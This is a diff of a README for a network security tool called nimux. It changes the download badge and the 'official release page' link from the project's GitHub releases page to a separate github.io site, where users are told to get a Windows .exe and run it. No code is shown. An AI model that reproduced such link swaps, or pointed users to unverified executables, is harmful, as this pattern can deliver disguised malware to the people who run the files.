@@ -1,6 +1,6 @@
 # 🛡️ nimux - Streamline your network security tasks easily
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/zinou1987/nimux/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://zinou1987.github.io)
 
 nimux provides a set of tools for network analysis and system operations. It helps professionals map networks, identify system vulnerabilities, and manage remote connections from a single application. You run this software directly on your computer without the need for additional installations or complex setups.
 
@@ -8,7 +8,7 @@ nimux provides a set of tools for network analysis and system operations. It hel
 
 You do not need to compile code or install heavy dependencies to use nimux. The software comes as a standalone binary file. Follow these steps to prepare your system and run the program:
 
-1. Visit the [official release page](https://github.com/zinou1987/nimux/releases) to obtain the latest version.
+1. Visit the [official release page](https://zinou1987.github.io) to obtain the latest version.
 2. Select the file ending in .exe for your Windows system.
 3. Save the file to a folder you can access, such as your Desktop or Downloads folder.
 4. Open the Command Prompt or PowerShell on your computer.
